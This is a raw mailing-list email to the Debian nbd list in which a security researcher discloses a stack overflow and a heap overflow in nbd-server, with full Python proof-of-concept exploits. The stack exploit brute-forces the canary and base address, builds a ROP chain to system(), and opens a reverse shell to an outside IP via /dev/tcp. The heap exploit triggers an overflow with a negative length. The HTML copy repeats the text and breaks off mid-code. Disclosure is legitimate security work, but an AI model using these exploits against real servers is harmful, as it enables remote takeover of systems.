Return-Path: <bounce-nbd=lists+nbd=lfdr.de@other.debian.org>
X-Original-To: lists+nbd@lfdr.de
Delivered-To: lists+nbd@lfdr.de
Received: from bendel.debian.org (bendel.debian.org [IPv6:2001:41b8:202:deb:216:36ff:fe40:4002])
	by mail.lfdr.de (Postfix) with ESMTPS id BCF24497825
	for <lists+nbd@lfdr.de>; Mon, 24 Jan 2022 05:27:13 +0100 (CET)
Received: from localhost (localhost [127.0.0.1])
	by bendel.debian.org (Postfix) with QMQP
	id 6E222205C0; Mon, 24 Jan 2022 04:27:13 +0000 (UTC)
X-Mailbox-Line: From nbd-request@other.debian.org  Mon Jan 24 04:27:13 2022
Old-Return-Path: <duo.wang@chaitin.com>
X-Spam-Checker-Version: SpamAssassin 3.4.2 (2018-09-13) on bendel.debian.org
X-Spam-Level: **
X-Spam-Status: No, score=2.3 required=4.0 tests=DIGITS_LETTERS,DKIM_SIGNED,
	DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,HTML_MESSAGE,MD5_SHA1_SUM,
	NUMERIC_HTTP_ADDR,RCVD_IN_DNSWL_NONE autolearn=no autolearn_force=no
	version=3.4.2
X-Original-To: lists-other-nbd@bendel.debian.org
Delivered-To: lists-other-nbd@bendel.debian.org
Received: from localhost (localhost [127.0.0.1])
	by bendel.debian.org (Postfix) with ESMTP id 0BEF020389
	for <lists-other-nbd@bendel.debian.org>; Mon, 24 Jan 2022 04:10:33 +0000 (UTC)
X-Virus-Scanned: at lists.debian.org with policy bank en-lt
X-Amavis-Spam-Status: No, score=1.042 tagged_above=-10000 required=5.3
	tests=[BAYES_00=-2, DIGITS_LETTERS=1, DKIM_SIGNED=0.1,
	DKIM_VALID=-0.1, DKIM_VALID_AU=-0.1, DKIM_VALID_EF=-0.1,
	HTML_MESSAGE=2, MD5_SHA1_SUM=-1, NUMERIC_HTTP_ADDR=1.242,
	RCVD_IN_DNSWL_NONE=-0.0001] autolearn=no autolearn_force=no
Received: from bendel.debian.org ([127.0.0.1])
	by localhost (lists.debian.org [127.0.0.1]) (amavisd-new, port 2525)
	with ESMTP id Em0baTG-rvs0 for <lists-other-nbd@bendel.debian.org>;
	Mon, 24 Jan 2022 04:10:26 +0000 (UTC)
X-policyd-weight:  NOT_IN_SBL_XBL_SPAMHAUS=-1.5 CL_IP_EQ_HELO_IP=-2 (check from: .chaitin. - helo: .mail-oo1-xc2c.google. - helo-domain: .google.)  FROM/MX_MATCHES_HELO(DOMAIN)=-2; rate: -5.5
Received: from mail-oo1-xc2c.google.com (mail-oo1-xc2c.google.com [IPv6:2607:f8b0:4864:20::c2c])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256
	 client-signature RSA-PSS (2048 bits) client-digest SHA256)
	(Client CN "smtp.gmail.com", Issuer "GTS CA 1D4" (not verified))
	by bendel.debian.org (Postfix) with ESMTPS id 21E43205A9
	for <nbd@other.debian.org>; Mon, 24 Jan 2022 04:10:21 +0000 (UTC)
Received: by mail-oo1-xc2c.google.com with SMTP id q145-20020a4a3397000000b002e85c7234b1so706504ooq.8
        for <nbd@other.debian.org>; Sun, 23 Jan 2022 20:10:21 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=chaitin.com; s=google;
        h=mime-version:from:date:message-id:subject:to;
        bh=vYbE5CUG+rEJP9RJM9oDKqVTEChBrqtZxPaJEO2fFtw=;
        b=F6Y2XVR8gv65HDSoXQDmqYyYgZI3XRe0wttQXwsqGwgYJ7C5qnnJTeT0dv/f17ygXd
         RGUsRPNWNcbRmTsKfTmxyaUFsS0me1DC7IaJSR6m6BrhuA3epcm9yvf40f6CkRFb2z84
         R8IxZKHY2KQKKrsorbmw4cqk4GXVwBOhsMVZE=
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=vYbE5CUG+rEJP9RJM9oDKqVTEChBrqtZxPaJEO2fFtw=;
        b=uqTWB5QoIze+51tRcodIjhGg76j4JEoc0M+v2uaNTQiMK4OSnCnoZtwWpPr5Kp9DiN
         rnz4jNNabPLqmFjqBAacQokeYJUhqSQmhcD7Sm4wfDWENvIJ3OkEhwRLef5mfwObfLsS
         LVx1Pxgm1XdSdvpziuHdvEM4KyWgQ9nnuo7UwfA2VN3OEuKU/4SHsf1+OkhloCMqeiHF
         MdvmEbact9ZtN1sRmVpWL8d4AilKFFDDnklG6tdAjRaRjB58nBMJKT0PfSQ9LelCNno4
         8qcNdWGt2ZMfuXgqmF6un0mJkmyH6/YCkkaOoHWqgZ1jXDLvxlf/wFH16o/mPoHRov+6
         /ylQ==
X-Gm-Message-State: AOAM531peIKLtRs6JO6VFreBiAZhmCWOwRng+scdlm3YWRZzwdGltakO
	sG4Bu+6ewtpMbVh5rRhAUbbPUC4UeMd804aK378/OkVGgtQrWIc9
X-Google-Smtp-Source: ABdhPJy0XJJFguVJazov4iAdrpE5zv9liQkfy+h0i6lEyOfS0GrW3sg0yZGy+z5X3FN4bbq5R6MqQoAU1slJNZRksWw=
X-Received: by 2002:a4a:e281:: with SMTP id k1mr3566307oot.74.1642997418158;
 Sun, 23 Jan 2022 20:10:18 -0800 (PST)
MIME-Version: 1.0
From: =?UTF-8?B?546L5aSa?= <duo.wang@chaitin.com>
Date: Mon, 24 Jan 2022 12:10:06 +0800
Message-ID: <CAFfU0HAYyuiuvVDe622zP7OLXDYRftrYzvYjeRxgLaKoq2E0+A@mail.gmail.com>
Subject: report security problem of nbd
To: nbd@other.debian.org
Content-Type: multipart/alternative; boundary="0000000000007a020205d64c2551"
X-Rc-Spam: 2008-11-04_01
X-Rc-Virus: 2007-09-13_01
X-Rc-Spam: 2008-11-04_01
Resent-Message-ID: <beb77-nnU6I.A.Wh.hqi7hB@bendel>
Resent-From: nbd@other.debian.org
X-Mailing-List: <nbd@other.debian.org> archive/latest/1704
X-Loop: nbd@other.debian.org
List-Id: <nbd.other.debian.org>
List-URL: <https://lists.debian.org/nbd/>
List-Post: <mailto:nbd@other.debian.org>
List-Help: <mailto:nbd-request@other.debian.org?subject=help>
List-Subscribe: <mailto:nbd-request@other.debian.org?subject=subscribe>
List-Unsubscribe: <mailto:nbd-request@other.debian.org?subject=unsubscribe>
Precedence: list
Resent-Sender: nbd-request@other.debian.org
List-Archive: https://lists.debian.org/msgid-search/CAFfU0HAYyuiuvVDe622zP7OLXDYRftrYzvYjeRxgLaKoq2E0+A@mail.gmail.com
Resent-Date: Mon, 24 Jan 2022 04:27:13 +0000 (UTC)

--0000000000007a020205d64c2551
Content-Type: text/plain; charset="UTF-8"

1.stack overflow
In nbd-server.c, function handle_info have a stack overflow

https://github.com/NetworkBlockDevice/nbd/blob/5750003711b8050bad3ddaf5196201ef419ce15d/nbd-server.c#L2299

len can be controlled by an attacker, the buf size is 1024, when `len -
sizeof(namelen) > 1024` the buf overflow.

python poc code as following:
from pwn import *
import time
import sys

context.endian = "big"
context.log_level = "debug"

elf = ELF("./nbd-server")

NBD_OPT = {
    "NBD_OPT_EXPORT_NAME":1,
    "NBD_OPT_ABORT":2,
    "NBD_OPT_LIST":3,
    "NBD_OPT_STARTTLS":5,
    "NBD_OPT_INFO":6,
    "NBD_OPT_GO":7,
    "NBD_OPT_STRUCTURED_REPLY":8,
    "NBD_OPT_LIST_META_CONTEXT":9,
    "NBD_OPT_SET_META_CONTEXT":10
}

NBD_NEW_VERSION = b"IHAVEOPT"

def nbd_opt_info(buf, name):
    option = b""
    option += NBD_NEW_VERSION
    option += p32(NBD_OPT["NBD_OPT_INFO"])
    option += p32(len(buf) + 4)
    option += p32(len(name))
    option += buf
    option += name
    option += p16(0)
    p.send(option)

    return

def nbd_opt_list():
    option = b""
    option += NBD_NEW_VERSION
    option += p32(NBD_OPT["NBD_OPT_LIST"])
    option += p32(0)
    p.send(option)

    return

def nbd_opt_structured_reply():
    option = b""
    option += NBD_NEW_VERSION
    option += p32(NBD_OPT["NBD_OPT_STRUCTURED_REPLY"])
    option += p32(0)
    p.send(option)

    return

def nbd_opt_set_meta_context(exportname, querystring):
    option = b""
    option += NBD_NEW_VERSION
    option += p32(NBD_OPT["NBD_OPT_SET_META_CONTEXT"])
    option += p32(4 + len(exportname) + 4 + 4 + len(querystring))
    p.send(option)

    msg = b""
    msg += p32(len(exportname)) # exportnamelen
    msg += exportname.encode("latin") # exportname
    msg += p32(1) # nr_queries
    msg += p32(len(querystring)) # querylen
    msg += querystring.encode("latin") # querystring
    p.send(msg)

    return

def nbd_opt_list_meta_context(exportname, querystring):
    option = b""
    option += NBD_NEW_VERSION
    option += p32(NBD_OPT["NBD_OPT_LIST_META_CONTEXT"])
    option += p32(4 + len(exportname) + 4 + 4 + len(querystring))
    p.send(option)

    msg = b""
    msg += p32(len(exportname)) # exportnamelen
    msg += exportname.encode("latin") # exportname
    msg += p32(1) # nr_queries
    msg += p32(len(querystring)) # querylen
    msg += querystring.encode("latin") # querystring
    p.send(msg)

    return

def nbd_opt_go(exportname, info):
    option = b""
    option += NBD_NEW_VERSION
    option += p32(NBD_OPT["NBD_OPT_GO"])
    option += p32(4 + len(exportname) + 2 + 2)
    p.send(option)

    msg = b""
    msg += p32(len(exportname)) # exportnamelen
    msg += exportname.encode("latin") # exportname
    msg += p16(1) # nrinfos
    msg += p16(info) # info
    p.send(msg)

    return

t0 = time.perf_counter()

if len(sys.argv) < 3:
    print("usage: nbdtest.py ip port")
    exit(0)

ip = sys.argv[1]
port = int(sys.argv[2])
p = remote(ip, port)

p.recvuntil(b"NBDMAGICIHAVEOPT")
gflag = u16(p.recv())
p.send(p32(gflag))

canary = b"\x00"
for i in range(7):
    for j in range(256):
        payload = b""
        payload += b"A"*1032
        payload += canary
        payload += p8(j)
        nbd_opt_info(payload, b"B"*4096)
        p.recvuntil(b"Export unknown")

        p.send(NBD_NEW_VERSION + p32(0xdeadbeef) + p32(0))
        try:
            p.recvuntil(b"The given option is unknown to this server
implementation")
        except:
            p.close()

            p = remote(ip, port)
            p.recvuntil(b"NBDMAGICIHAVEOPT")
            gflag = u16(p.recv())
            p.send(p32(gflag))
            continue

        canary += p8(j)
        p.close()

        p = remote(ip, port)
        p.recvuntil(b"NBDMAGICIHAVEOPT")
        gflag = u16(p.recv())
        p.send(p32(gflag))
        break

log.success("canary: "+ hex(u64(canary.ljust(8, b"\x00"), endian='little')))

progaddr = b"\x70"
for i in range(5):
    for j in range(256):
        payload = b""
        payload += b"A"*1032
        payload += canary
        payload += p64(0xdeadbeef, endian='little')*7
        payload += progaddr
        payload += p8(j)
        nbd_opt_info(payload, b"B"*4096)
        p.recvuntil(b"Export unknown")

        try:
            p.recvuntil(b"NBDMAGICIHAVEOPT")
        except:
            p.close()

            p = remote(ip, port)
            p.recvuntil(b"NBDMAGICIHAVEOPT")
            gflag = u16(p.recv())
            p.send(p32(gflag))
            continue

        progaddr += p8(j)
        p.close()

        p = remote(ip, port)
        p.recvuntil(b"NBDMAGICIHAVEOPT")
        gflag = u16(p.recv())
        p.send(p32(gflag))
        break

proc_base = u64(progaddr.ljust(8, b"\x00"), endian='little') - 0x9570
log.success("proc_base: "+ hex(proc_base))

payload = b""
payload += b"A"*1032
payload += canary
payload += p64(0xdeadbeef, endian='little')*7
payload += p64(proc_base + 0xC2AA, endian='little')
payload += p64(0, endian='little')
payload += p64(1, endian='little')
payload += p64(4, endian='little')
payload += p64(proc_base + 0x13400, endian='little')
payload += p64(0x40, endian='little')
payload += p64(proc_base + elf.got['read'], endian='little')
payload += p64(proc_base + 0xC290, endian='little')
payload += p64(0)*7
payload += p64(proc_base + 0x4a58, endian='little')
payload += p64(proc_base + 0x13400, endian='little')
payload += p64(proc_base + elf.plt['system'] , endian='little')
nbd_opt_info(payload, b"B"*4096)

p.send(b"bash -c 'sh -i >& /dev/tcp/192.168.228.133/23333 0>&1'")

print(time.perf_counter() - t0)
p.interactive()


2.heap overflow
In nbd-server.c, function handle_info and handle_export_name have a
heap overflow

https://github.com/NetworkBlockDevice/nbd/blob/5750003711b8050bad3ddaf5196201ef419ce15d/nbd-server.c#L2302
https://github.com/NetworkBlockDevice/nbd/blob/5750003711b8050bad3ddaf5196201ef419ce15d/nbd-server.c#L2117

namelen can be controlled by an attacker,  when `namelen = -1`,  malloc
will allocate a very small buffer, but socket_read will read a 0xffffffff,
thus causing a heap overflow

from pwn import *

context.endian = "big"
context.log_level = "debug"

elf = ELF("./nbd-server")

NBD_OPT = {
    "NBD_OPT_EXPORT_NAME":1,
    "NBD_OPT_ABORT":2,
    "NBD_OPT_LIST":3,
    "NBD_OPT_STARTTLS":5,
    "NBD_OPT_INFO":6,
    "NBD_OPT_GO":7,
    "NBD_OPT_STRUCTURED_REPLY":8,
    "NBD_OPT_LIST_META_CONTEXT":9,
    "NBD_OPT_SET_META_CONTEXT":10
}

NBD_NEW_VERSION = b"IHAVEOPT"

def nbd_opt_info(buf, name):
    option = b""
    option += NBD_NEW_VERSION
    option += p32(NBD_OPT["NBD_OPT_INFO"])
    option += p32(len(buf) + 4)
    option += p32(len(name))
    option += buf
    option += name
    option += p16(0)
    p.send(option)

    return

if len(sys.argv) < 3:
    print("usage: nbdtest.py ip port")
    exit(0)

ip = sys.argv[1]
port = int(sys.argv[2])
p = remote(ip, port)

p.recvuntil(b"NBDMAGICIHAVEOPT")
gflag = u16(p.recv())
p.send(p32(gflag))

option = b""
option += NBD_NEW_VERSION
option += p32(NBD_OPT["NBD_OPT_INFO"])
option += p32(1024)
option += p32(-1)
option += b"A"*1024
option += b"B"*4096
option += p16(0)
p.send(option)

Wangduo of Chaitin Security Research Lab

--0000000000007a020205d64c2551
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

<div dir=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr"><div di=
r=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr"><div dir=3D"lt=
r"><div dir=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr"><div=
 dir=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr"><div dir=3D=
"ltr"><div dir=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr"><=
div dir=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr"><div dir=
=3D"ltr"><div dir=3D"ltr">1.stack overflow=C2=A0<div>In nbd-server.c, funct=
ion handle_info have a stack overflow=C2=A0</div><div><br></div><div><a hre=
f=3D"https://github.com/NetworkBlockDevice/nbd/blob/5750003711b8050bad3ddaf=
5196201ef419ce15d/nbd-server.c#L2299" target=3D"_blank">https://github.com/=
NetworkBlockDevice/nbd/blob/5750003711b8050bad3ddaf5196201ef419ce15d/nbd-se=
rver.c#L2299</a><br></div><div><br></div><div>len can be controlled by an a=
ttacker, the buf size is 1024, when `len - sizeof(namelen) &gt; 1024` the b=
uf overflow.</div><div><br></div><div>python poc code as following:</div><d=
iv><div style=3D"color:rgb(171,178,191);background-color:rgb(40,44,52);font=
-family:Consolas,&quot;Courier New&quot;,monospace;font-size:14px;line-heig=
ht:19px;white-space:pre"><div><span style=3D"color:rgb(198,120,221);font-st=
yle:italic">from</span> pwn <span style=3D"color:rgb(198,120,221);font-styl=
e:italic">import</span> <span style=3D"color:rgb(86,182,194)">*</span></div=
><div><span style=3D"color:rgb(198,120,221);font-style:italic">import</span=
> <span style=3D"color:rgb(229,192,123)">time</span></div><div><span style=
=3D"color:rgb(198,120,221);font-style:italic">import</span> <span style=3D"=
color:rgb(229,192,123)">sys</span></div><br><div>context.endian <span style=
=3D"color:rgb(86,182,194)">=3D</span> <span style=3D"color:rgb(152,195,121)=
">&quot;big&quot;</span></div><div>context.log_level <span style=3D"color:r=
gb(86,182,194)">=3D</span> <span style=3D"color:rgb(152,195,121)">&quot;deb=
ug&quot;</span></div><br><div><span style=3D"color:rgb(224,108,117)">elf</s=
pan> <span style=3D"color:rgb(86,182,194)">=3D</span> <span style=3D"color:=
rgb(97,175,239)">ELF</span>(<span style=3D"color:rgb(152,195,121)">&quot;./=
nbd-server&quot;</span>)</div><br><div><span style=3D"color:rgb(229,192,123=
)">NBD_OPT</span> <span style=3D"color:rgb(86,182,194)">=3D</span> {</div><=
div>=C2=A0 =C2=A0 <span style=3D"color:rgb(152,195,121)">&quot;NBD_OPT_EXPO=
RT_NAME&quot;</span>:<span style=3D"color:rgb(209,154,102)">1</span>,</div>=
<div>=C2=A0 =C2=A0 <span style=3D"color:rgb(152,195,121)">&quot;NBD_OPT_ABO=
RT&quot;</span>:<span style=3D"color:rgb(209,154,102)">2</span>,</div><div>=
=C2=A0 =C2=A0 <span style=3D"color:rgb(152,195,121)">&quot;NBD_OPT_LIST&quo=
t;</span>:<span style=3D"color:rgb(209,154,102)">3</span>,</div><div>=C2=A0=
 =C2=A0 <span style=3D"color:rgb(152,195,121)">&quot;NBD_OPT_STARTTLS&quot;=
</span>:<span style=3D"color:rgb(209,154,102)">5</span>,</div><div>=C2=A0 =
=C2=A0 <span style=3D"color:rgb(152,195,121)">&quot;NBD_OPT_INFO&quot;</spa=
n>:<span style=3D"color:rgb(209,154,102)">6</span>,</div><div>=C2=A0 =C2=A0=
 <span style=3D"color:rgb(152,195,121)">&quot;NBD_OPT_GO&quot;</span>:<span=
 style=3D"color:rgb(209,154,102)">7</span>,</div><div>=C2=A0 =C2=A0 <span s=
tyle=3D"color:rgb(152,195,121)">&quot;NBD_OPT_STRUCTURED_REPLY&quot;</span>=
:<span style=3D"color:rgb(209,154,102)">8</span>,</div><div>=C2=A0 =C2=A0 <=
span style=3D"color:rgb(152,195,121)">&quot;NBD_OPT_LIST_META_CONTEXT&quot;=
</span>:<span style=3D"color:rgb(209,154,102)">9</span>,</div><div>=C2=A0 =
=C2=A0 <span style=3D"color:rgb(152,195,121)">&quot;NBD_OPT_SET_META_CONTEX=
T&quot;</span>:<span style=3D"color:rgb(209,154,102)">10</span></div><div>}=
</div><br><div><span style=3D"color:rgb(229,192,123)">NBD_NEW_VERSION</span=
> <span style=3D"color:rgb(86,182,194)">=3D</span> <span style=3D"color:rgb=
(198,120,221)">b</span><span style=3D"color:rgb(152,195,121)">&quot;IHAVEOP=
T&quot;</span></div><br><div><span style=3D"color:rgb(198,120,221)">def</sp=
an> <span style=3D"color:rgb(97,175,239)">nbd_opt_info</span>(<span style=
=3D"color:rgb(224,108,117);font-style:italic">buf</span>, <span style=3D"co=
lor:rgb(224,108,117);font-style:italic">name</span>):</div><div>=C2=A0 =C2=
=A0 <span style=3D"color:rgb(224,108,117)">option</span> <span style=3D"col=
or:rgb(86,182,194)">=3D</span> <span style=3D"color:rgb(198,120,221)">b</sp=
an><span style=3D"color:rgb(152,195,121)">&quot;&quot;</span></div><div>=C2=
=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">option</span> <span style=
=3D"color:rgb(86,182,194)">+=3D</span> <span style=3D"color:rgb(229,192,123=
)">NBD_NEW_VERSION</span></div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(=
224,108,117)">option</span> <span style=3D"color:rgb(86,182,194)">+=3D</spa=
n> <span style=3D"color:rgb(97,175,239)">p32</span>(<span style=3D"color:rg=
b(229,192,123)">NBD_OPT</span>[<span style=3D"color:rgb(152,195,121)">&quot=
;NBD_OPT_INFO&quot;</span>])</div><div>=C2=A0 =C2=A0 <span style=3D"color:r=
gb(224,108,117)">option</span> <span style=3D"color:rgb(86,182,194)">+=3D</=
span> <span style=3D"color:rgb(97,175,239)">p32</span>(<span style=3D"color=
:rgb(97,175,239)">len</span>(<span style=3D"color:rgb(224,108,117);font-sty=
le:italic">buf</span>) <span style=3D"color:rgb(86,182,194)">+</span> <span=
 style=3D"color:rgb(209,154,102)">4</span>)</div><div>=C2=A0 =C2=A0 <span s=
tyle=3D"color:rgb(224,108,117)">option</span> <span style=3D"color:rgb(86,1=
82,194)">+=3D</span> <span style=3D"color:rgb(97,175,239)">p32</span>(<span=
 style=3D"color:rgb(97,175,239)">len</span>(<span style=3D"color:rgb(224,10=
8,117);font-style:italic">name</span>))</div><div>=C2=A0 =C2=A0 <span style=
=3D"color:rgb(224,108,117)">option</span> <span style=3D"color:rgb(86,182,1=
94)">+=3D</span> <span style=3D"color:rgb(224,108,117);font-style:italic">b=
uf</span></div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">op=
tion</span> <span style=3D"color:rgb(86,182,194)">+=3D</span> <span style=
=3D"color:rgb(224,108,117);font-style:italic">name</span></div><div>=C2=A0 =
=C2=A0 <span style=3D"color:rgb(224,108,117)">option</span> <span style=3D"=
color:rgb(86,182,194)">+=3D</span> <span style=3D"color:rgb(97,175,239)">p1=
6</span>(<span style=3D"color:rgb(209,154,102)">0</span>)</div><div>=C2=A0 =
=C2=A0 <span style=3D"color:rgb(224,108,117)">p</span>.<span style=3D"color=
:rgb(97,175,239)">send</span>(<span style=3D"color:rgb(224,108,117)">option=
</span>)</div><br><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(198,120,221);=
font-style:italic">return</span> </div><br><div><span style=3D"color:rgb(19=
8,120,221)">def</span> <span style=3D"color:rgb(97,175,239)">nbd_opt_list</=
span>():</div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">opt=
ion</span> <span style=3D"color:rgb(86,182,194)">=3D</span> <span style=3D"=
color:rgb(198,120,221)">b</span><span style=3D"color:rgb(152,195,121)">&quo=
t;&quot;</span></div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,11=
7)">option</span> <span style=3D"color:rgb(86,182,194)">+=3D</span> <span s=
tyle=3D"color:rgb(229,192,123)">NBD_NEW_VERSION</span></div><div>=C2=A0 =C2=
=A0 <span style=3D"color:rgb(224,108,117)">option</span> <span style=3D"col=
or:rgb(86,182,194)">+=3D</span> <span style=3D"color:rgb(97,175,239)">p32</=
span>(<span style=3D"color:rgb(229,192,123)">NBD_OPT</span>[<span style=3D"=
color:rgb(152,195,121)">&quot;NBD_OPT_LIST&quot;</span>])</div><div>=C2=A0 =
=C2=A0 <span style=3D"color:rgb(224,108,117)">option</span> <span style=3D"=
color:rgb(86,182,194)">+=3D</span> <span style=3D"color:rgb(97,175,239)">p3=
2</span>(<span style=3D"color:rgb(209,154,102)">0</span>)</div><div>=C2=A0 =
=C2=A0 <span style=3D"color:rgb(224,108,117)">p</span>.<span style=3D"color=
:rgb(97,175,239)">send</span>(<span style=3D"color:rgb(224,108,117)">option=
</span>)</div><br><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(198,120,221);=
font-style:italic">return</span> </div><br><div><span style=3D"color:rgb(19=
8,120,221)">def</span> <span style=3D"color:rgb(97,175,239)">nbd_opt_struct=
ured_reply</span>():</div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(224,1=
08,117)">option</span> <span style=3D"color:rgb(86,182,194)">=3D</span> <sp=
an style=3D"color:rgb(198,120,221)">b</span><span style=3D"color:rgb(152,19=
5,121)">&quot;&quot;</span></div><div>=C2=A0 =C2=A0 <span style=3D"color:rg=
b(224,108,117)">option</span> <span style=3D"color:rgb(86,182,194)">+=3D</s=
pan> <span style=3D"color:rgb(229,192,123)">NBD_NEW_VERSION</span></div><di=
v>=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">option</span> <span =
style=3D"color:rgb(86,182,194)">+=3D</span> <span style=3D"color:rgb(97,175=
,239)">p32</span>(<span style=3D"color:rgb(229,192,123)">NBD_OPT</span>[<sp=
an style=3D"color:rgb(152,195,121)">&quot;NBD_OPT_STRUCTURED_REPLY&quot;</s=
pan>])</div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">optio=
n</span> <span style=3D"color:rgb(86,182,194)">+=3D</span> <span style=3D"c=
olor:rgb(97,175,239)">p32</span>(<span style=3D"color:rgb(209,154,102)">0</=
span>)</div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">p</sp=
an>.<span style=3D"color:rgb(97,175,239)">send</span>(<span style=3D"color:=
rgb(224,108,117)">option</span>)</div><br><div>=C2=A0 =C2=A0 <span style=3D=
"color:rgb(198,120,221);font-style:italic">return</span> </div><br><div><sp=
an style=3D"color:rgb(198,120,221)">def</span> <span style=3D"color:rgb(97,=
175,239)">nbd_opt_set_meta_context</span>(<span style=3D"color:rgb(224,108,=
117);font-style:italic">exportname</span>, <span style=3D"color:rgb(224,108=
,117);font-style:italic">querystring</span>):</div><div>=C2=A0 =C2=A0 <span=
 style=3D"color:rgb(224,108,117)">option</span> <span style=3D"color:rgb(86=
,182,194)">=3D</span> <span style=3D"color:rgb(198,120,221)">b</span><span =
style=3D"color:rgb(152,195,121)">&quot;&quot;</span></div><div>=C2=A0 =C2=
=A0 <span style=3D"color:rgb(224,108,117)">option</span> <span style=3D"col=
or:rgb(86,182,194)">+=3D</span> <span style=3D"color:rgb(229,192,123)">NBD_=
NEW_VERSION</span></div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108=
,117)">option</span> <span style=3D"color:rgb(86,182,194)">+=3D</span> <spa=
n style=3D"color:rgb(97,175,239)">p32</span>(<span style=3D"color:rgb(229,1=
92,123)">NBD_OPT</span>[<span style=3D"color:rgb(152,195,121)">&quot;NBD_OP=
T_SET_META_CONTEXT&quot;</span>])</div><div>=C2=A0 =C2=A0 <span style=3D"co=
lor:rgb(224,108,117)">option</span> <span style=3D"color:rgb(86,182,194)">+=
=3D</span> <span style=3D"color:rgb(97,175,239)">p32</span>(<span style=3D"=
color:rgb(209,154,102)">4</span> <span style=3D"color:rgb(86,182,194)">+</s=
pan> <span style=3D"color:rgb(97,175,239)">len</span>(<span style=3D"color:=
rgb(224,108,117);font-style:italic">exportname</span>) <span style=3D"color=
:rgb(86,182,194)">+</span> <span style=3D"color:rgb(209,154,102)">4</span> =
<span style=3D"color:rgb(86,182,194)">+</span> <span style=3D"color:rgb(209=
,154,102)">4</span> <span style=3D"color:rgb(86,182,194)">+</span> <span st=
yle=3D"color:rgb(97,175,239)">len</span>(<span style=3D"color:rgb(224,108,1=
17);font-style:italic">querystring</span>))</div><div>=C2=A0 =C2=A0 <span s=
tyle=3D"color:rgb(224,108,117)">p</span>.<span style=3D"color:rgb(97,175,23=
9)">send</span>(<span style=3D"color:rgb(224,108,117)">option</span>)</div>=
<br><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">msg</span> <s=
pan style=3D"color:rgb(86,182,194)">=3D</span> <span style=3D"color:rgb(198=
,120,221)">b</span><span style=3D"color:rgb(152,195,121)">&quot;&quot;</spa=
n></div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">msg</span=
> <span style=3D"color:rgb(86,182,194)">+=3D</span> <span style=3D"color:rg=
b(97,175,239)">p32</span>(<span style=3D"color:rgb(97,175,239)">len</span>(=
<span style=3D"color:rgb(224,108,117);font-style:italic">exportname</span>)=
) <span style=3D"color:rgb(127,132,142);font-style:italic"># exportnamelen<=
/span></div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">msg</=
span> <span style=3D"color:rgb(86,182,194)">+=3D</span> <span style=3D"colo=
r:rgb(224,108,117);font-style:italic">exportname</span>.<span style=3D"colo=
r:rgb(97,175,239)">encode</span>(<span style=3D"color:rgb(152,195,121)">&qu=
ot;latin&quot;</span>) <span style=3D"color:rgb(127,132,142);font-style:ita=
lic"># exportname</span></div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(2=
24,108,117)">msg</span> <span style=3D"color:rgb(86,182,194)">+=3D</span> <=
span style=3D"color:rgb(97,175,239)">p32</span>(<span style=3D"color:rgb(20=
9,154,102)">1</span>) <span style=3D"color:rgb(127,132,142);font-style:ital=
ic"># nr_queries</span></div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(22=
4,108,117)">msg</span> <span style=3D"color:rgb(86,182,194)">+=3D</span> <s=
pan style=3D"color:rgb(97,175,239)">p32</span>(<span style=3D"color:rgb(97,=
175,239)">len</span>(<span style=3D"color:rgb(224,108,117);font-style:itali=
c">querystring</span>)) <span style=3D"color:rgb(127,132,142);font-style:it=
alic"># querylen</span></div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(22=
4,108,117)">msg</span> <span style=3D"color:rgb(86,182,194)">+=3D</span> <s=
pan style=3D"color:rgb(224,108,117);font-style:italic">querystring</span>.<=
span style=3D"color:rgb(97,175,239)">encode</span>(<span style=3D"color:rgb=
(152,195,121)">&quot;latin&quot;</span>) <span style=3D"color:rgb(127,132,1=
42);font-style:italic"># querystring</span></div><div>=C2=A0 =C2=A0 <span s=
tyle=3D"color:rgb(224,108,117)">p</span>.<span style=3D"color:rgb(97,175,23=
9)">send</span>(<span style=3D"color:rgb(224,108,117)">msg</span>)</div><br=
><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(198,120,221);font-style:italic=
">return</span></div><br><div><span style=3D"color:rgb(198,120,221)">def</s=
pan> <span style=3D"color:rgb(97,175,239)">nbd_opt_list_meta_context</span>=
(<span style=3D"color:rgb(224,108,117);font-style:italic">exportname</span>=
, <span style=3D"color:rgb(224,108,117);font-style:italic">querystring</spa=
n>):</div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">option<=
/span> <span style=3D"color:rgb(86,182,194)">=3D</span> <span style=3D"colo=
r:rgb(198,120,221)">b</span><span style=3D"color:rgb(152,195,121)">&quot;&q=
uot;</span></div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">=
